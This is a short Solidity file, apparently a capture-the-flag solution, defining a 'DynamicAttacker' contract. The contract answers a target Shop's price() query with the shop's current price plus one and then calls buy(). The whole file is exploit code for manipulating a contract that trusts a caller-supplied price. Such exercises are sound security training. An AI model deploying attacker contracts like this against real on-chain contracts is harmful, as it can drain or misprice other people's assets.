pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function price() external view returns (uint256);
}

contract DynamicAttacker {
    Shop public shop;

    constructor(address instance) {
        shop = Shop(instance);
    }

    function price() external view returns (uint256) {
        return shop.price() + 1;
    }

    function attack() external {
        shop.buy();
    }
}
